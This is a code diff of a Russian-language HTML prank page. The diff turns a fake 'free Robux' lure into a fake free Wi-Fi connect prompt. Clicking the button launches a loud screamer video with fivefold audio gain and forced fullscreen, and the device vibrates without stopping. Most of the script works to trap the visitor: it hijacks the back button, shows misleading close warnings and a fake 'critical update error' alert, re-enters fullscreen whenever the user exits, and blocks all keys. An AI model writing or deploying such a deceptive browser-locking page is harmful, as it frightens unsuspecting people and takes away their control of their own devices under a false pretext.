@@ -3,104 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>БЕСПЛАТНЫЙ РОБАКС / WI-FI</title>
+    <title>Wi-Fi Connect</title>
     <style>
         body {
-            margin: 0; padding: 0; background: #ffffff;
-            font-family: sans-serif; display: flex;
-            justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden;
-            user-select: none; -webkit-user-select: none;
+            margin: 0; padding: 0; background: #f2f2f7;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden; user-select: none;
         }
-        #ui { text-align: center; }
-        .icon { font-size: 80px; margin-bottom: 15px; }
-        h1 { font-size: 26px; color: #333; }
+        #ui { text-align: center; width: 90%; }
+        .wifi-loader {
+            width: 80px; height: 80px; border: 4px solid #007aff;
+            border-radius: 50%; border-top-color: transparent;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1 { font-size: 24px; color: #000; margin-bottom: 10px; }
+        p { color: #8e8e93; font-size: 16px; margin-bottom: 30px; }
         button {
-            background: #28a745; color: white; border: none;
-            padding: 20px 60px; font-size: 24px; border-radius: 50px;
-            font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            background: #007aff; color: white; border: none;
+            width: 100%; max-width: 300px; padding: 18px;
+            font-size: 20px; border-radius: 14px; font-weight: 600;
+            cursor: pointer; active { background: #0051a8; }
         }
-        #screamer-container {
-            display: none; position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: black; z-index: 9999;
+        #screamer-wrap {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh; background: #000; z-index: 9999;
         }
         video { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
-<body oncontextmenu="return false;"> <div id="ui">
-        <div class="icon">🎁</div>
-        <h1>ПОЛУЧИТЬ 5000 РОБАКСОВ</h1>
-        <p id="status">Нажмите для проверки устройства</p>
-        <button onclick="handleAction()">ПОЛУЧИТЬ</button>
+<body oncontextmenu="return false;">
+
+    <div id="ui">
+        <div class="wifi-loader"></div>
+        <h1>Доступна сеть "Free_WiFi_HighSpeed"</h1>
+        <p>Для подключения нажмите кнопку ниже</p>
+        <button onclick="startTrap()">ПОДКЛЮЧИТЬ</button>
     </div>
 
-    <div id="screamer-container">
+    <div id="screamer-wrap">
         <video id="scaryVideo" playsinline loop>
             <source src="1909901693.mp4" type="video/mp4">
         </video>
     </div>
 
     <script>
-        let attempts = 0;
+        const video = document.getElementById('scaryVideo');
+        const wrap = document.getElementById('screamer-wrap');
 
-        function handleAction() {
-            attempts++;
-            const status = document.getElementById('status');
-            
-            if (attempts < 2) {
-                status.innerText = "Ошибка сервера... Пробуем еще раз";
-                status.style.color = "orange";
-            } else if (attempts === 2) {
-                status.innerText = "Почти готово! Последнее нажатие...";
-                status.style.color = "blue";
-            } else {
-                startScreamer();
+        async function startTrap() {
+            // 1. Полноэкранный режим
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) doc.requestFullscreen();
+            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+
+            // 2. Переворот экрана в горизонтальный режим (Landscape)
+            if (screen.orientation && screen.orientation.lock) {
+                screen.orientation.lock('landscape').catch(() => {
+                    console.log("Нужен клик для переворота");
+                });
             }
-        }
 
-        async function startScreamer() {
-            const container = document.getElementById('screamer-container');
-            const video = document.getElementById('scaryVideo');
-
-            // 1. Усиление звука (Web Audio API)
+            // 3. Звук на максимум (программное усиление)
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const source = audioCtx.createMediaElementSource(video);
-                const gainNode = audioCtx.createGain();
-                gainNode.gain.value = 5.0; 
-                source.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-            } catch(e) {}
+                const gain = audioCtx.createGain();
+                gain.gain.value = 5.0; // Усиление в 5 раз
+                source.connect(gain);
+                gain.connect(audioCtx.destination);
+            } catch (e) {}
 
-            // 2. Вход в Fullscreen
-            enterFull();
-
-            // 3. Пытаемся заблокировать выход (предупреждение при закрытии вкладки)
-            window.onbeforeunload = function() {
-                return "Вы уверены, что хотите уйти без приза?";
-            };
-
-            // 4. Зацикливание Fullscreen: если пользователь нажмет Esc, пробуем вернуть его назад
-            document.addEventListener('fullscreenchange', () => {
-                if (!document.fullscreenElement) {
-                    // Если вышел из фуллскрина — принудительно возвращаем через секунду при клике
-                    status.innerText = "ВЕРНИСЬ И ЗАБЕРИ ПРИЗ!";
-                }
-            });
-
-            // Визуальное переключение
+            // 4. Показываем видео
             document.getElementById('ui').style.display = 'none';
-            container.style.display = 'block';
-            
+            wrap.style.display = 'block';
             video.play();
 
-            // 5. Постоянная вибрация
+            // 5. Бесконечная вибрация
             if (navigator.vibrate) {
-                setInterval(() => {
-                    navigator.vibrate([1000, 50, 1000, 50, 1000]);
-                }, 1000);
+                setInterval(() => navigator.vibrate([500, 100, 500, 100]), 1000);
             }
+
+            // 6. БЛОКИРОВКА ВЫХОДА (Психологическая и техническая)
+            
+            // Запрет кнопки "Назад"
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => {
+                window.history.pushState(null, null, window.location.href);
+                enterFull(); // Возвращаем фуллскрин при попытке выйти
+            };
+
+            // Предупреждение при закрытии вкладки
+            window.onbeforeunload = () => "СИСТЕМА ЗАБЛОКИРОВАНА!";
+
+            // Если он выйдет из фуллскрина (свайпом), сразу выкидываем ошибку
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    alert("КРИТИЧЕСКАЯ ОШИБКА ОБНОВЛЕНИЯ! Нажмите ОК для восстановления.");
+                    enterFull();
+                }
+            });
         }
 
         function enterFull() {
@@ -109,13 +112,9 @@
             else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
         }
 
-        // Блокировка клавиш (F12, Ctrl+U и т.д. для ПК)
-        document.onkeydown = function(e) {
-            if(e.keyCode == 123) return false;
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
-            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        // Блокировка клавиш (на случай если он с клавиатурой)
+        document.onkeydown = (e) => {
+            return false; // Отключает всё, включая F12 и Esc
         };
     </script>
 </body>
